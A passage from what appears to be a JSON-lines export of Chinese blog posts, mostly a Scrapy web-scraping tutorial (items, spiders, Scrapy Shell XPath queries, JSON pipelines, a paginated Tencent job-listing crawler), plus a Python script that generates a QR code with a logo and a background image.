src=\"https://img-blog.csdnimg.cn/20191102003250387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>下面来简单介绍一下各个主要文件的作用：</p>\n\n<blockquote>\n<p>scrapy.cfg ：项目的配置文件</p>\n\n<p>mySpider/ ：项目的Python模块，将会从这里引用代码</p>\n\n<p>mySpider/items.py ：项目的目标文件</p>\n\n<p>mySpider/pipelines.py ：项目的管道文件</p>\n\n<p>mySpider/settings.py ：项目的设置文件</p>\n\n<p>mySpider/spiders/ ：存储爬虫代码目录</p>\n</blockquote>\n\n<h2 id=\"二、明确目标myspideritemspy\">二、明确目标(mySpider/items.py)</h2>\n\n<p>我们打算抓取：<a href=\"http://www.itcast.cn/channel/teacher.shtml\" rel=\"nofollow\">http://www.itcast.cn/channel/teacher.shtml</a> 网站里的所有讲师的姓名、职称和个人信息。</p>\n\n<ol><li>\n\t<p>打开mySpider目录下的items.py</p>\n\t</li>\n\t<li>\n\t<p>Item 定义结构化数据字段，用来保存爬取到的数据，有点像Python中的dict，但是提供了一些额外的保护减少错误。</p>\n\t</li>\n\t<li>\n\t<p>可以通过创建一个 scrapy.Item 类， 并且定义类型为 scrapy.Field的类属性来定义一个Item（可以理解成类似于ORM的映射关系）。</p>\n\t</li>\n\t<li>\n\t<p>接下来，创建一个ItcastItem 类，和构建item模型（model）。</p>\n\t</li>\n</ol><pre class=\"has\">\n<code>import scrapy\n\nclass ItcastItem(scrapy.Item):\n    name = scrapy.Field()\n    level = scrapy.Field()\n    info = scrapy.Field()\n</code></pre>\n\n<h2 id=\"三、制作爬虫-（spidersitcastspiderpy）\">三、制作爬虫 （spiders/itcastSpider.py）</h2>\n\n<p><strong>爬虫功能要分两步：</strong></p>\n\n<h3 id=\"1-爬数据\">1. 爬数据</h3>\n\n<ul><li>在当前目录下输入命令，将在<code>mySpider/spider</code>目录下创建一个名为<code>itcast</code>的爬虫，并指定爬取域的范围：</li>\n</ul><pre class=\"has\">\n<code>scrapy genspider itcast \"itcast.cn\"\n</code></pre>\n\n<ul><li>打开 mySpider/spider目录里的 itcast.py，默认增加了下列代码:</li>\n</ul><pre class=\"has\">\n<code>import scrapy\n\nclass ItcastSpider(scrapy.Spider):\n    name = \"itcast\"\n    allowed_domains = [\"itcast.cn\"]\n    start_urls = (\n        'http://www.itcast.cn/',\n    )\n\n    def parse(self, response):\n        pass\n</code></pre>\n\n<p>其实也可以由我们自行创建itcast.py并编写上面的代码，只不过使用命令可以免去编写固定代码的麻烦</p>\n\n<p>要建立一个Spider， 你必须用scrapy.Spider类创建一个子类，并确定了三个强制的属性 和 一个方法。</p>\n\n<ul><li>\n\t<p><code>name = \"\"</code> ：这个爬虫的识别名称，必须是唯一的，在不同的爬虫必须定义不同的名字。</p>\n\t</li>\n\t<li>\n\t<p><code>allow_domains = []</code> 是搜索的域名范围，也就是爬虫的约束区域，规定爬虫只爬取这个域名下的网页，不存在的URL会被忽略。</p>\n\t</li>\n\t<li>\n\t<p><code>start_urls = ()</code> ：爬取的URL元祖/列表。爬虫从这里开始抓取数据，所以，第一次下载的数据将会从这些urls开始。其他子URL将会从这些起始URL中继承性生成。</p>\n\t</li>\n\t<li>\n\t<p><code>parse(self, response)</code> ：解析的方法，每个初始URL完成下载后将被调用，调用的时候传入从每一个URL传回的Response对象来作为唯一参数，主要作用如下：</p>\n\n\t<ol><li>负责解析返回的网页数据(response.body)，提取结构化数据(生成item)</li>\n\t\t<li>生成需要下一页的URL请求。</li>\n\t</ol></li>\n</ul><p>将start_urls的值修改为需要爬取的第一个url</p>\n\n<pre class=\"has\">\n<code>start_urls = (\"http://www.itcast.cn/channel/teacher.shtml\",)\n</code></pre>\n\n<p>修改parse()方法</p>\n\n<pre class=\"has\">\n<code>def parse(self, response):\n    filename = \"teacher.html\"\n    open(filename, 'w').write(response.body)\n</code></pre>\n\n<p>然后运行一下看看，在mySpider目录下执行：</p>\n\n<pre class=\"has\">\n<code>scrapy crawl itcast\n</code></pre>\n\n<p>是的，就是 itcast，看上面代码，它是 ItcastSpider 类的 name 属性，也就是使用 <code>scrapy genspider</code>命令的唯一爬虫名。</p>\n\n<p>运行之后，如果打印的日志出现 <code>[scrapy] INFO: Spider closed (finished)</code>，代表执行完成。 之后当前文件夹中就出现了一个 teacher.html 文件，里面就是我们刚刚要爬取的网页的全部源代码信息。</p>\n\n<pre class=\"has\">\n<code># 注意，Python2.x默认编码环境是ASCII，当和取回的数据编码格式不一致时，可能会造成乱码；\n# 我们可以指定保存内容的编码格式，一般情况下，我们可以在代码最上方添加：\n\n    import sys\n    reload(sys)\n    sys.setdefaultencoding(\"utf-8\")\n\n# 这三行代码是Python2.x里解决中文编码的万能钥匙，经过这么多年的吐槽后Python3学乖了，默认编码是Unicode了...(祝大家早日拥抱Python3)\n</code></pre>\n\n<hr><h3 id=\"2-取数据\">2. 取数据</h3>\n\n<ul><li>爬取整个网页完毕，接下来的就是的取过程了，首先观察页面源码：</li>\n</ul><p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191102003305287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<pre class=\"has\">\n<code>&lt;div class=\"li_txt\"&gt;\n    &lt;h3&gt;  xxx  &lt;/h3&gt;\n    &lt;h4&gt; xxxxx &lt;/h4&gt;\n    &lt;p&gt; xxxxxxxx &lt;/p&gt;\n</code></pre>\n\n<p>是不是一目了然？直接上XPath开始提取数据吧。</p>\n\n<ul><li>我们之前在mySpider/items.py 里定义了一个ItcastItem类。 这里引入进来</li>\n</ul><pre class=\"has\">\n<code>  from mySpider.items import ItcastItem\n</code></pre>\n\n<ul><li>然后将我们得到的数据封装到一个 <code>ItcastItem</code> 对象中，可以保存每个老师的属性：</li>\n</ul><pre class=\"has\">\n<code>from mySpider.items import ItcastItem\n\ndef parse(self, response):\n    #open(\"teacher.html\",\"wb\").write(response.body).close()\n\n    # 存放老师信息的集合\n    items = []\n\n    for each in response.xpath(\"//div[@class='li_txt']\"):\n        # 将我们得到的数据封装到一个 `ItcastItem` 对象\n        item = ItcastItem()\n        #extract()方法返回的都是unicode字符串\n        name = each.xpath(\"h3/text()\").extract()\n        title = each.xpath(\"h4/text()\").extract()\n        info = each.xpath(\"p/text()\").extract()\n\n        #xpath返回的是包含一个元素的列表\n        item['name'] = name[0]\n        item['title'] = title[0]\n        item['info'] = info[0]\n\n        items.append(item)\n\n    # 直接返回最后数据\n    return items\n</code></pre>\n\n<ul><li>我们暂时先不处理管道，后面会详细介绍。</li>\n</ul><h2 id=\"保存数据\">保存数据</h2>\n\n<p>scrapy保存信息的最简单的方法主要有四种，-o 输出指定格式的文件，，命令如下：</p>\n\n<pre class=\"has\">\n<code># json格式，默认为Unicode编码\nscrapy crawl itcast -o teachers.json\n\n# json lines格式，默认为Unicode编码\nscrapy crawl itcast -o teachers.jsonl\n\n# csv 逗号表达式，可用Excel打开\nscrapy crawl itcast -o teachers.csv\n\n# xml格式\nscrapy crawl itcast -o teachers.xml\n</code></pre>\n\n<hr><h2 id=\"思考\">思考</h2>\n\n<p>如果将代码改成下面形式，结果完全一样。</p>\n\n<p>请思考 yield 在这里的作用：</p>\n\n<pre class=\"has\">\n<code>from mySpider.items import ItcastItem\n\ndef parse(self, response):\n    #open(\"teacher.html\",\"wb\").write(response.body).close()\n\n    # 存放老师信息的集合\n    #items = []\n\n    for each in response.xpath(\"//div[@class='li_txt']\"):\n        # 将我们得到的数据封装到一个 `ItcastItem` 对象\n        item = ItcastItem()\n        #extract()方法返回的都是unicode字符串\n        name = each.xpath(\"h3/text()\").extract()\n        title = each.xpath(\"h4/text()\").extract()\n        info = each.xpath(\"p/text()\").extract()\n\n        #xpath返回的是包含一个元素的列表\n        item['name'] = name[0]\n        item['title'] = title[0]\n        item['info'] = info[0]\n\n        #items.append(item)\n\n        #将获取的数据交给pipelines\n        yield item\n\n    # 返回数据，不经过pipeline\n    #return items</code></pre>\n                                    </div>", "log_PostTime": 1584891225, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "python3生成二维码中间带logo，有底图，可自定义文字", "log_Intro": "python3生成二维码中间带logo，有底图，可自定义文字", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>效果：</h1>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191102111719628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<pre>\nqrcode_result.png\n</pre>\n\n<h1>代码：</h1>\n\n<pre class=\"has\">\n<code class=\"language-python\">#!/user/bin/Python3\n\"\"\"\n@Lanson\n@2019-11-02\n\"\"\"\n\n\"\"\"\n需要安装的包：\n    pip install pillow\n    pip install numpy\n    pip install imageio\n    pip install qrcode\n    pip install matplotlib\n    pip install myqr\npython版本：3.7+\n\"\"\"\nimport qrcode\nfrom PIL import Image\nimport matplotlib.pyplot as plt\nfrom PIL import ImageDraw\nfrom PIL import ImageFont\n'''\n【红色】：red 【橙色】：orange 【黄色】：yellow 【绿】：green 【 蓝】：blue【紫】：purple \n【灰色】：gray 【白色】：white 【粉红色】：pink 【黑色】：black【墨绿色】：dark green 【橙红色】：orange-red\n'''\ndef getQRcode(strs, name):\n    qr = qrcode.QRCode(\n        version=1,\n        error_correction=qrcode.constants.ERROR_CORRECT_L,\n        box_size=10,\n        border=2,\n    )\n    # 添加数据\n    qr.add_data(strs)\n    # 填充数据\n    qr.make(fit=True)\n    # 生成图片\n    img = qr.make_image(fill_color=\"black\", back_color=\"white\")\n    img = img.convert(\"CMYK\")  # RGBA\n    # 添加logo\n    icon = Image.open(\"logo.jpg\")\n    # 获取图片的宽高\n    img_w, img_h = img.size\n    factor = 6\n    size_w = int(img_w / factor)\n    size_h = int(img_h / factor)\n    icon_w, icon_h = icon.size\n    if icon_w &gt; size_w:\n        icon_w = size_w\n    if icon_h &gt; size_h:\n        icon_h = size_h\n    # 重新设置logo的尺寸\n    icon = icon.resize((icon_w, icon_h), Image.ANTIALIAS)\n    w = int((img_w - icon_w) / 2)\n    h = int((img_h - icon_h) / 2)\n\n\n    img.paste(icon, (w, h), None)\n    # 显示图片\n    # plt.imshow(img)\n    # plt.show()\n    img = img.convert('RGB')\n    img.save(name)\n    return img\ndef info(name,body,num):\n    getQRcode(body, name)\n    oriImg = Image.open(\"ditu.jpg\")\n    oriImg2 = Image.open(name)\n    oriImg2 = oriImg2.resize((285, 290))#设置二维码大小\n    oriImg.paste(oriImg2, (100, 95))#将二维码放在底图上\n    draw = ImageDraw.Draw(oriImg)\n    font = ImageFont.truetype('AdobeGothicStd-Bold.otf', 40)#设置字体\n    draw.text((100, 425), '博主:'+num, (50, 51, 51), font=font)#把字添加到图片上\n    oriImg = oriImg.convert('RGB')\n    oriImg.save(name)\nif __name__ == '__main__':\n    info(\"qrcode_result.png\",\"https://blog.csdn.net/xiaoweite1\",\"Lansonli\")\n    print(\"自定义二维码生成成功!!!\")</code></pre>\n\n<h3>参数说明</h3>\n\n<p><img alt=\"\" class=\"has\" height=\"237\" src=\"https://img-blog.csdnimg.cn/20191102112408586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"903\"></p>\n\n<p> </p>\n\n<p>image.png</p>\n\n<blockquote> </blockquote>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191102112534292.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>ditu.jpg</p>\n\n<p><img alt=\"\" class=\"has\" height=\"100\" src=\"https://img-blog.csdnimg.cn/201911021125576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"100\"></p>\n\n<p>logo.jpg</p>\n\n<h3>文章所用图片说明</h3>\n\n<blockquote>\n<p>logo.jpg 显示在二维码中心的图(959,959)<br>\nditu.jpg 图片底图 (475,489)</p>\n</blockquote>\n                                    </div>", "log_PostTime": 1584891226, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Scrapy Shell", "log_Intro": "Python:Scrapy Shell", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>Scrapy终端是一个交互终端，我们可以在未启动spider的情况下尝试及调试代码，也可以用来测试XPath或CSS表达式，查看他们的工作方式，方便我们爬取的网页中提取的数据。</p>\n\n<p>如果安装了 IPython ，Scrapy终端将使用 IPython (替代标准Python终端)。 IPython 终端与其他相比更为强大，提供智能的自动补全，高亮输出，及其他特性。（推荐安装IPython）</p>\n\n<h2 id=\"启动scrapy-shell\">启动Scrapy Shell</h2>\n\n<p>进入项目的根目录，执行下列命令来启动shell:</p>\n\n<pre class=\"has\">\n<code>scrapy shell \"http://www.itcast.cn/channel/teacher.shtml\"\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019110223533554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<p>Scrapy Shell根据下载的页面会自动创建一些方便使用的对象，例如 Response 对象，以及 <code>Selector 对象 (对HTML及XML内容)</code>。</p>\n\n<ul><li>\n\t<p>当shell载入后，将得到一个包含response数据的本地 response 变量，输入 <code>response.body</code>将输出response的包体，输出 <code>response.headers</code> 可以看到response的包头。</p>\n\t</li>\n\t<li>\n\t<p>输入 <code>response.selector</code> 时， 将获取到一个response 初始化的类 Selector 的对象，此时可以通过使用 <code>response.selector.xpath()</code>或<code>response.selector.css()</code> 来对 response 进行查询。</p>\n\t</li>\n\t<li>\n\t<p>Scrapy也提供了一些快捷方式, 例如 <code>response.xpath()</code>或<code>response.css()</code>同样可以生效（如之前的案例）。</p>\n\t</li>\n</ul><h2 id=\"selectors选择器\">Selectors选择器</h2>\n\n<p>Scrapy Selectors 内置 XPath 和 CSS Selector 表达式机制</p>\n\n<p>Selector有四个基本的方法，最常用的还是xpath:</p>\n\n<ul><li>xpath(): 传入xpath表达式，返回该表达式所对应的所有节点的selector list列表</li>\n\t<li>extract(): 序列化该节点为Unicode字符串并返回list</li>\n\t<li>css(): 传入CSS表达式，返回该表达式所对应的所有节点的selector list列表，语法同 BeautifulSoup4</li>\n\t<li>re(): 根据传入的正则表达式对数据进行提取，返回Unicode字符串list列表</li>\n</ul><p>XPath表达式的例子及对应的含义:</p>\n\n<pre class=\"has\">\n<code>/html/head/title: 选择&lt;HTML&gt;文档中 &lt;head&gt; 标签内的 &lt;title&gt; 元素\n/html/head/title/text(): 选择上面提到的 &lt;title&gt; 元素的文字\n//td: 选择所有的 &lt;td&gt; 元素\n//div[@class=\"mine\"]: 选择所有具有 class=\"mine\" 属性的 div 元素\n</code></pre>\n\n<p>尝试Selector</p>\n\n<p>我们用腾讯社招的网站<a href=\"http://hr.tencent.com/position.php?&amp;start=0#a\" rel=\"nofollow\">http://hr.tencent.com/position.php?&amp;start=0#a</a>举例：</p>\n\n<pre class=\"has\">\n<code># 启动\nscrapy shell \"http://hr.tencent.com/position.php?&amp;start=0#a\"\n\n# 返回 xpath选择器对象列表\nresponse.xpath('//title')\n[&lt;Selector xpath='//title' data=u'&lt;title&gt;\\u804c\\u4f4d\\u641c\\u7d22 | \\u793e\\u4f1a\\u62db\\u8058 | Tencent \\u817e\\u8baf\\u62db\\u8058&lt;/title'&gt;]\n\n# 使用 extract()方法返回 Unicode字符串列表\nresponse.xpath('//title').extract()\n[u'&lt;title&gt;\\u804c\\u4f4d\\u641c\\u7d22 | \\u793e\\u4f1a\\u62db\\u8058 | Tencent \\u817e\\u8baf\\u62db\\u8058&lt;/title&gt;']\n\n# 打印列表第一个元素，终端编码格式显示\nprint response.xpath('//title').extract()[0]\n&lt;title&gt;职位搜索 | 社会招聘 | Tencent 腾讯招聘&lt;/title&gt;\n\n# 返回 xpath选择器对象列表\nresponse.xpath('//title/text()')\n&lt;Selector xpath='//title/text()' data=u'\\u804c\\u4f4d\\u641c\\u7d22 | \\u793e\\u4f1a\\u62db\\u8058 | Tencent \\u817e\\u8baf\\u62db\\u8058'&gt;\n\n# 返回列表第一个元素的Unicode字符串\nresponse.xpath('//title/text()')[0].extract()\nu'\\u804c\\u4f4d\\u641c\\u7d22 | \\u793e\\u4f1a\\u62db\\u8058 | Tencent \\u817e\\u8baf\\u62db\\u8058'\n\n# 按终端编码格式显示\nprint response.xpath('//title/text()')[0].extract()\n职位搜索 | 社会招聘 | Tencent 腾讯招聘\n\nresponse.xpath('//*[@class=\"even\"]')\n职位名称:\n\nprint site[0].xpath('./td[1]/a/text()').extract()[0]\nTEG15-运营开发工程师（深圳）\n职位名称详情页:\n\nprint site[0].xpath('./td[1]/a/@href').extract()[0]\nposition_detail.php?id=20744&amp;keywords=&amp;tid=0&amp;lid=0\n职位类别:\n\nprint site[0].xpath('./td[2]/text()').extract()[0]\n技术类\n</code></pre>\n\n<p>以后做数据提取的时候，可以把现在Scrapy Shell中测试，测试通过后再应用到代码中。</p>\n\n<p>当然Scrapy Shell作用不仅仅如此，但是不属于我们课程重点，不做详细介绍。</p>\n\n<p>官方文档：<a href=\"http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/shell.html\" rel=\"nofollow\">http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/shell.html</a></p>\n                                    </div>", "log_PostTime": 1584891227, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Item Pipeline", "log_Intro": "Python:Item Pipeline", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>当Item在Spider中被收集之后，它将会被传递到Item Pipeline，这些Item Pipeline组件按定义的顺序处理Item。</p>\n\n<p>每个Item Pipeline都是实现了简单方法的Python类，比如决定此Item是丢弃而存储。以下是item pipeline的一些典型应用：</p>\n\n<ul><li>验证爬取的数据(检查item包含某些字段，比如说name字段)</li>\n\t<li>查重(并丢弃)</li>\n\t<li>将爬取结果保存到文件或者数据库中</li>\n</ul><h2 id=\"编写item-pipeline\">编写item pipeline</h2>\n\n<p>编写item pipeline很简单，item pipiline组件是一个独立的Python类，其中process_item()方法必须实现:</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">import something\n\nclass SomethingPipeline(object):\n    def __init__(self):    \n        # 可选实现，做参数初始化等\n        # doing something\n\n    def process_item(self, item, spider):\n        # item (Item 对象) – 被爬取的item\n        # spider (Spider 对象) – 爬取该item的spider\n        # 这个方法必须实现，每个item pipeline组件都需要调用该方法，\n        # 这个方法必须返回一个 Item 对象，被丢弃的item将不会被之后的pipeline组件所处理。\n        return item\n\n    def open_spider(self, spider):\n        # spider (Spider 对象) – 被开启的spider\n        # 可选实现，当spider被开启时，这个方法被调用。\n\n    def close_spider(self, spider):\n        # spider (Spider 对象) – 被关闭的spider\n        # 可选实现，当spider被关闭时，这个方法被调用\n</code></pre>\n\n<h2 id=\"完善之前的案例：\">完善之前的案例：</h2>\n\n<p>item写入JSON文件</p>\n\n<p>以下pipeline将所有(从所有'spider'中)爬取到的item，存储到一个独立地items.json 文件，每行包含一个序列化为'JSON'格式的'item':</p>\n\n<pre class=\"has\">\n<code>import json\n\nclass ItcastJsonPipeline(object):\n\n    def __init__(self):\n        self.file = open('teacher.json', 'wb')\n\n    def process_item(self, item, spider):\n        content = json.dumps(dict(item), ensure_ascii=False) + \"\\n\"\n        self.file.write(content)\n        return item\n\n    def close_spider(self, spider):\n        self.file.close()\n</code></pre>\n\n<p>启用一个Item Pipeline组件</p>\n\n<p>为了启用Item Pipeline组件，必须将它的类添加到 settings.py文件ITEM_PIPELINES 配置，就像下面这个例子:</p>\n\n<pre class=\"has\">\n<code># Configure item pipelines\n# See http://scrapy.readthedocs.org/en/latest/topics/item-pipeline.html\nITEM_PIPELINES = {\n    #'mySpider.pipelines.SomePipeline': 300,\n    \"mySpider.pipelines.ItcastJsonPipeline\":300\n}\n</code></pre>\n\n<p>分配给每个类的整型值，确定了他们运行的顺序，item按数字从低到高的顺序，通过pipeline，通常将这些数字定义在0-1000范围内（0-1000随意设置，数值越低，组件的优先级越高）</p>\n\n<p>重新启动爬虫</p>\n\n<p>将parse()方法改为4.2中最后思考中的代码，然后执行下面的命令：</p>\n\n<pre class=\"has\">\n<code>scrapy crawl itcast\n</code></pre>\n\n<p>查看当前目录是否生成teacher.json</p>\n                                    </div>", "log_PostTime": 1584891227, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Spider", "log_Intro": "Python:Spider", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>Spider类定义了如何爬取某个(或某些)网站。包括了爬取的动作(例如:是否跟进链接)以及如何从网页的内容中提取结构化数据(爬取item)。 换句话说，Spider就是您定义爬取的动作及分析某个网页(或者是有些网页)的地方。</p>\n\n<p><code>class scrapy.Spider</code>是最基本的类，所有编写的爬虫必须继承这个类。</p>\n\n<p>主要用到的函数及调用顺序为：</p>\n\n<p><code>__init__()</code> : 初始化爬虫名字和start_urls列表</p>\n\n<p><code>start_requests() 调用make_requests_from url()</code>:生成Requests对象交给Scrapy下载并返回response</p>\n\n<p><code>parse()</code> : 解析response，并返回Item或Requests（需指定回调函数）。Item传给Item pipline持久化 ， 而Requests交由Scrapy下载，并由指定的回调函数处理（默认parse())，一直进行循环，直到处理完所有的数据为止。</p>\n\n<p>源码参考</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">#所有爬虫的基类，用户定义的爬虫必须从这个类继承\nclass Spider(object_ref):\n\n    #定义spider名字的字符串(string)。spider的名字定义了Scrapy如何定位(并初始化)spider，所以其必须是唯一的。\n    #name是spider最重要的属性，而且是必须的。\n    #一般做法是以该网站(domain)(加或不加 后缀 )来命名spider。 例如，如果spider爬取 mywebsite.com ，该spider通常会被命名为 mywebsite\n    name = None\n\n    #初始化，提取爬虫名字，start_ruls\n    def __init__(self, name=None, **kwargs):\n        if name is not None:\n            self.name = name\n        # 如果爬虫没有名字，中断后续操作则报错\n        elif not getattr(self, 'name', None):\n            raise ValueError(\"%s must have a name\" % type(self).__name__)\n\n        # python 对象或类型通过内置成员__dict__来存储成员信息\n        self.__dict__.update(kwargs)\n\n        #URL列表。当没有指定的URL时，spider将从该列表中开始进行爬取。 因此，第一个被获取到的页面的URL将是该列表之一。 后续的URL将会从获取到的数据中提取。\n        if not hasattr(self, 'start_urls'):\n            self.start_urls = []\n\n    # 打印Scrapy执行后的log信息\n    def log(self, message, level=log.DEBUG, **kw):\n        log.msg(message, spider=self, level=level, **kw)\n\n    # 判断对象object的属性是否存在，不存在做断言处理\n    def set_crawler(self, crawler):\n        assert not hasattr(self, '_crawler'), \"Spider already bounded to %s\" % crawler\n        self._crawler = crawler\n\n    @property\n    def crawler(self):\n        assert hasattr(self, '_crawler'), \"Spider not bounded to any crawler\"\n        return self._crawler\n\n    @property\n    def settings(self):\n        return self.crawler.settings\n\n    #该方法将读取start_urls内的地址，并为每一个地址生成一个Request对象，交给Scrapy下载并返回Response\n    #该方法仅调用一次\n    def start_requests(self):\n        for url in self.start_urls:\n            yield self.make_requests_from_url(url)\n\n    #start_requests()中调用，实际生成Request的函数。\n    #Request对象默认的回调函数为parse()，提交的方式为get\n    def make_requests_from_url(self, url):\n        return Request(url, dont_filter=True)\n\n    #默认的Request对象回调函数，处理返回的response。\n    #生成Item或者Request对象。用户必须实现这个类\n    def parse(self, response):\n        raise NotImplementedError\n\n    @classmethod\n    def handles_request(cls, request):\n        return url_is_from_spider(request.url, cls)\n\n    def __str__(self):\n        return \"&lt;%s %r at 0x%0x&gt;\" % (type(self).__name__, self.name, id(self))\n\n    __repr__ = __str__\n</code></pre>\n\n<p>主要属性和方法</p>\n\n<ul><li>\n\t<p>name</p>\n\n\t<blockquote>\n\t<p>定义spider名字的字符串。</p>\n\n\t<p>例如，如果spider爬取 mywebsite.com ，该spider通常会被命名为 mywebsite</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p>allowed_domains</p>\n\n\t<blockquote>\n\t<p>包含了spider允许爬取的域名(domain)的列表，可选。</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p>start_urls</p>\n\n\t<blockquote>\n\t<p>初始URL元祖/列表。当没有制定特定的URL时，spider将从该列表中开始进行爬取。</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p>start_requests(self)</p>\n\n\t<blockquote>\n\t<p>该方法必须返回一个可迭代对象(iterable)。该对象包含了spider用于爬取（默认实现是使用 start_urls 的url）的第一个Request。</p>\n\n\t<p>当spider启动爬取并且未指定start_urls时，该方法被调用。</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p>parse(self, response)</p>\n\n\t<blockquote>\n\t<p>当请求url返回网页没有指定回调函数时，默认的Request对象回调函数。用来处理网页返回的response，以及生成Item或者Request对象。</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p>log(self, message[, level, component])</p>\n\n\t<blockquote>\n\t<p>使用 scrapy.log.msg() 方法记录(log)message。 更多数据请参见 <a href=\"4.7.html\" rel=\"nofollow\">logging</a></p>\n\t</blockquote>\n\t</li>\n</ul><p>案例：腾讯招聘网自动翻页采集</p>\n\n<ul><li>创建一个新的爬虫：</li>\n</ul><p><code>scrapy genspider tencent \"tencent.com\"</code></p>\n\n<ul><li>编写items.py</li>\n</ul><p>获取职位名称、详细信息、</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">class TencentItem(scrapy.Item):\n    name = scrapy.Field()\n    detailLink = scrapy.Field()\n    positionInfo = scrapy.Field()\n    peopleNumber = scrapy.Field()\n    workLocation = scrapy.Field()\n    publishTime = scrapy.Field()\n</code></pre>\n\n<ul><li>编写tencent.py</li>\n</ul><pre class=\"has\">\n<code class=\"language-python\"># tencent.py\n\nfrom mySpider.items import TencentItem\nimport scrapy\nimport re\n\nclass TencentSpider(scrapy.Spider):\n    name = \"tencent\"\n    allowed_domains = [\"hr.tencent.com\"]\n    start_urls = [\n        \"http://hr.tencent.com/position.php?&amp;start=0#a\"\n    ]\n\n    def parse(self, response):\n        for each in response.xpath('//*[@class=\"even\"]'):\n\n            item = TencentItem()\n            name = each.xpath('./td[1]/a/text()').extract()[0]\n            detailLink = each.xpath('./td[1]/a/@href').extract()[0]\n            positionInfo = each.xpath('./td[2]/text()').extract()[0]\n            peopleNumber = each.xpath('./td[3]/text()').extract()[0]\n            workLocation = each.xpath('./td[4]/text()').extract()[0]\n            publishTime = each.xpath('./td[5]/text()').extract()[0]\n\n            #print name, detailLink, catalog, peopleNumber, workLocation,publishTime\n\n            item['name'] = name.encode('utf-8')\n            item['detailLink'] = detailLink.encode('utf-8')\n            item['positionInfo'] = positionInfo.encode('utf-8')\n            item['peopleNumber'] = peopleNumber.encode('utf-8')\n            item['workLocation'] = workLocation.encode('utf-8')\n            item['publishTime'] = publishTime.encode('utf-8')\n\n            curpage = re.search('(\\d+)',response.url).group(1)\n            page = int(curpage) + 10\n            url = re.sub('\\d+', str(page), response.url)\n\n            # 发送新的url请求加入待爬队列，并调用回调函数 self.parse\n            yield scrapy.Request(url, callback = self.parse)\n\n            # 将获取的数据交给pipeline\n            yield item\n</code></pre>\n\n<ul><li>编写pipeline.py文件</li>\n</ul><pre class=\"has\">\n<code class=\"language-python\">import json\n\n#class ItcastJsonPipeline(object):\nclass TencentJsonPipeline(object):\n\n    def __init__(self):\n        #self.file = open('teacher.json', 'wb')\n        self.file = open('tencent.json', 'wb')\n\n    def process_item(self, item, spider):\n        content = json.dumps(dict(item), ensure_ascii=False) + \"\\n\"\n        self.file.write(content)\n        return item\n\n    def close_spider(self, spider):\n        self.file.close()\n</code></pre>\n\n<ul><li>在 setting.py 里设置ITEM_PIPELINES</li>\n</ul><pre class=\"has\">\n<code>ITEM_PIPELINES = {\n    #'mySpider.pipelines.SomePipeline': 300,\n    #\"mySpider.pipelines.ItcastJsonPipeline\":300\n    \"mySpider.pipelines.TencentJsonPipeline\":300\n}\n</code></pre>\n\n<ul><li>执行爬虫：<code>scrapy crawl tencent</code></li>\n</ul><h2 id=\"思考\">思考</h2>\n\n<p>请思考 parse()方法的工作机制：</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">\n1. 因为使用的yield，而不是return。parse函数将会被当做一个生成器使用。scrapy会逐一获取parse方法中生成的结果，并判断该结果是一个什么样的类型；\n2. 如果是request则加入爬取队列，如果是item类型则使用pipeline处理，其他类型则返回错误信息。\n3. scrapy取到第一部分的request不会立马就去发送这个request，只是把这个request放到队列里，然后接着从生成器里获取；\n4. 取尽第一部分的request，然后再获取第二部分的item，取到item了，就会放到对应的pipeline里处理；\n5. parse()方法作为回调函数(callback)赋值给了Request，指定parse()方法来处理这些请求 